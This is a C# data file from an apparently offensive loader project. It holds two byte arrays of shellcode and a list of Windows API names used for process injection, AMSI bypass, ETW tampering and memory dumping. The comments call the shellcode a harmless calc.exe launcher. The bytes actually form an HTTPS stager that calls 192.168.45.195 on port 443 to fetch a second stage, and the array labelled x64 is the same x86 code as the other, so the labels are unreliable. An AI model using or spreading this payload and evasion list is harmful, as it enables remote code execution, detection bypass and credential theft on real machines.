﻿namespace NetRunners.Encryptor.Data
{
    /// <summary>
    /// This class contains the unencrypted shellcode generated by your C2 client and other data to be encrypted.
    /// </summary>
    public static class Data
    {
        // msfvenom -p windows/x64/exec -f csharp CMD=calc.exe
        public static byte[] buf = new byte[702] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,
0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,0x85,0xc9,0x74,
0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,
0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,
0x53,0xe8,0x81,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,
0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x69,0x50,0x61,0x64,0x3b,
0x20,0x43,0x50,0x55,0x20,0x4f,0x53,0x20,0x31,0x37,0x5f,0x30,
0x5f,0x32,0x20,0x6c,0x69,0x6b,0x65,0x20,0x4d,0x61,0x63,0x20,
0x4f,0x53,0x20,0x58,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,
0x65,0x62,0x4b,0x69,0x74,0x2f,0x36,0x30,0x35,0x2e,0x31,0x2e,
0x31,0x35,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,
0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x56,
0x65,0x72,0x73,0x69,0x6f,0x6e,0x2f,0x31,0x36,0x2e,0x35,0x20,
0x4d,0x6f,0x62,0x69,0x6c,0x65,0x2f,0x31,0x35,0x45,0x31,0x34,
0x38,0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x36,0x30,0x34,
0x2e,0x31,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,
0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x3e,0x01,
0x00,0x00,0x2f,0x75,0x62,0x31,0x6d,0x41,0x79,0x6a,0x38,0x6c,
0x4d,0x68,0x79,0x71,0x58,0x4f,0x6f,0x46,0x4b,0x33,0x74,0x71,
0x67,0x66,0x7a,0x76,0x66,0x42,0x67,0x63,0x43,0x56,0x55,0x4f,
0x38,0x51,0x56,0x68,0x67,0x52,0x55,0x6f,0x57,0x36,0x51,0x4a,
0x32,0x50,0x52,0x71,0x6f,0x66,0x46,0x64,0x31,0x54,0x74,0x6c,
0x66,0x52,0x6f,0x38,0x78,0x34,0x76,0x31,0x65,0x51,0x35,0x34,
0x54,0x32,0x43,0x72,0x57,0x57,0x66,0x5a,0x33,0x32,0x71,0x70,
0x65,0x6e,0x47,0x54,0x6f,0x76,0x75,0x67,0x50,0x61,0x79,0x34,
0x36,0x50,0x44,0x48,0x51,0x6b,0x61,0x39,0x57,0x72,0x4a,0x47,
0x4d,0x59,0x38,0x4b,0x72,0x59,0x35,0x56,0x43,0x30,0x68,0x4f,
0x69,0x64,0x4d,0x31,0x7a,0x71,0x5f,0x56,0x34,0x72,0x66,0x48,
0x70,0x42,0x67,0x38,0x4b,0x32,0x59,0x33,0x6a,0x44,0x4c,0x51,
0x5f,0x4d,0x59,0x72,0x6d,0x75,0x6e,0x6e,0x2d,0x56,0x36,0x76,
0x33,0x69,0x35,0x61,0x62,0x48,0x41,0x37,0x54,0x78,0x62,0x79,
0x49,0x45,0x68,0x34,0x4b,0x44,0x43,0x49,0x00,0x50,0x68,0x57,
0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,
0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,
0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,
0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,
0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,
0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,
0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4b,0x00,
0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,
0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,
0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,
0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,
0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,
0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,
0x2e,0x31,0x39,0x35,0x00,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5
};


        // msfvenom -p windows/exec -f csharp CMD=calc.exe
        public static byte[] buf86 = new byte[702] {0xfc,0xe8,0x8f,0x00,0x00,0x00,
0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,
0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,
0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,
0x01,0xc7,0x49,0x75,0xef,0x52,0x8b,0x52,0x10,0x57,0x8b,0x42,
0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4c,0x01,0xd0,
0x50,0x8b,0x58,0x20,0x8b,0x48,0x18,0x01,0xd3,0x85,0xc9,0x74,
0x3c,0x31,0xff,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xc0,0xac,
0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,
0x3b,0x7d,0x24,0x75,0xe0,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,
0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,
0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,
0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xe9,0x80,0xff,0xff,0xff,0x5d,
0x68,0x6e,0x65,0x74,0x00,0x68,0x77,0x69,0x6e,0x69,0x54,0x68,
0x4c,0x77,0x26,0x07,0xff,0xd5,0x31,0xdb,0x53,0x53,0x53,0x53,
0x53,0xe8,0x81,0x00,0x00,0x00,0x4d,0x6f,0x7a,0x69,0x6c,0x6c,
0x61,0x2f,0x35,0x2e,0x30,0x20,0x28,0x69,0x50,0x61,0x64,0x3b,
0x20,0x43,0x50,0x55,0x20,0x4f,0x53,0x20,0x31,0x37,0x5f,0x30,
0x5f,0x32,0x20,0x6c,0x69,0x6b,0x65,0x20,0x4d,0x61,0x63,0x20,
0x4f,0x53,0x20,0x58,0x29,0x20,0x41,0x70,0x70,0x6c,0x65,0x57,
0x65,0x62,0x4b,0x69,0x74,0x2f,0x36,0x30,0x35,0x2e,0x31,0x2e,
0x31,0x35,0x20,0x28,0x4b,0x48,0x54,0x4d,0x4c,0x2c,0x20,0x6c,
0x69,0x6b,0x65,0x20,0x47,0x65,0x63,0x6b,0x6f,0x29,0x20,0x56,
0x65,0x72,0x73,0x69,0x6f,0x6e,0x2f,0x31,0x36,0x2e,0x35,0x20,
0x4d,0x6f,0x62,0x69,0x6c,0x65,0x2f,0x31,0x35,0x45,0x31,0x34,
0x38,0x20,0x53,0x61,0x66,0x61,0x72,0x69,0x2f,0x36,0x30,0x34,
0x2e,0x31,0x00,0x68,0x3a,0x56,0x79,0xa7,0xff,0xd5,0x53,0x53,
0x6a,0x03,0x53,0x53,0x68,0xbb,0x01,0x00,0x00,0xe8,0x3e,0x01,
0x00,0x00,0x2f,0x75,0x62,0x31,0x6d,0x41,0x79,0x6a,0x38,0x6c,
0x4d,0x68,0x79,0x71,0x58,0x4f,0x6f,0x46,0x4b,0x33,0x74,0x71,
0x67,0x66,0x7a,0x76,0x66,0x42,0x67,0x63,0x43,0x56,0x55,0x4f,
0x38,0x51,0x56,0x68,0x67,0x52,0x55,0x6f,0x57,0x36,0x51,0x4a,
0x32,0x50,0x52,0x71,0x6f,0x66,0x46,0x64,0x31,0x54,0x74,0x6c,
0x66,0x52,0x6f,0x38,0x78,0x34,0x76,0x31,0x65,0x51,0x35,0x34,
0x54,0x32,0x43,0x72,0x57,0x57,0x66,0x5a,0x33,0x32,0x71,0x70,
0x65,0x6e,0x47,0x54,0x6f,0x76,0x75,0x67,0x50,0x61,0x79,0x34,
0x36,0x50,0x44,0x48,0x51,0x6b,0x61,0x39,0x57,0x72,0x4a,0x47,
0x4d,0x59,0x38,0x4b,0x72,0x59,0x35,0x56,0x43,0x30,0x68,0x4f,
0x69,0x64,0x4d,0x31,0x7a,0x71,0x5f,0x56,0x34,0x72,0x66,0x48,
0x70,0x42,0x67,0x38,0x4b,0x32,0x59,0x33,0x6a,0x44,0x4c,0x51,
0x5f,0x4d,0x59,0x72,0x6d,0x75,0x6e,0x6e,0x2d,0x56,0x36,0x76,
0x33,0x69,0x35,0x61,0x62,0x48,0x41,0x37,0x54,0x78,0x62,0x79,
0x49,0x45,0x68,0x34,0x4b,0x44,0x43,0x49,0x00,0x50,0x68,0x57,
0x89,0x9f,0xc6,0xff,0xd5,0x89,0xc6,0x53,0x68,0x00,0x32,0xe8,
0x84,0x53,0x53,0x53,0x57,0x53,0x56,0x68,0xeb,0x55,0x2e,0x3b,
0xff,0xd5,0x96,0x6a,0x0a,0x5f,0x68,0x80,0x33,0x00,0x00,0x89,
0xe0,0x6a,0x04,0x50,0x6a,0x1f,0x56,0x68,0x75,0x46,0x9e,0x86,
0xff,0xd5,0x53,0x53,0x53,0x53,0x56,0x68,0x2d,0x06,0x18,0x7b,
0xff,0xd5,0x85,0xc0,0x75,0x14,0x68,0x88,0x13,0x00,0x00,0x68,
0x44,0xf0,0x35,0xe0,0xff,0xd5,0x4f,0x75,0xcd,0xe8,0x4b,0x00,
0x00,0x00,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x68,0x00,0x00,
0x40,0x00,0x53,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,
0x53,0x89,0xe7,0x57,0x68,0x00,0x20,0x00,0x00,0x53,0x56,0x68,
0x12,0x96,0x89,0xe2,0xff,0xd5,0x85,0xc0,0x74,0xcf,0x8b,0x07,
0x01,0xc3,0x85,0xc0,0x75,0xe5,0x58,0xc3,0x5f,0xe8,0x6b,0xff,
0xff,0xff,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x34,0x35,
0x2e,0x31,0x39,0x35,0x00,0xbb,0xe0,0x1d,0x2a,0x0a,0x68,0xa6,
0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,
0x75,0x05,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x00,0x53,0xff,0xd5
};


        // API strings
        public static readonly string[] FunctionNames =
{
            "VirtualAlloc",
            "VirtualProtect",
            "CreateThread",
            "WaitForSingleObject",
            "VirtualAllocEx",
            "WriteProcessMemory",
            "CreateRemoteThread",
            "OpenProcess",
            "GetCurrentProcess",
            "FlsAlloc",
            "VirtualAllocExNuma",
            "CreateProcessA",
            "ZwQueryInformationProcess",
            "ReadProcessMemory",
            "ResumeThread",
            "LoadLibraryA",
            "GetStdHandle",
            "MiniDumpWriteDump",
            "amsi.dll",
            "AmsiOpenSession",
            "AmsiScanBuffer",
            "NtTraceEvent"
        };
    }
}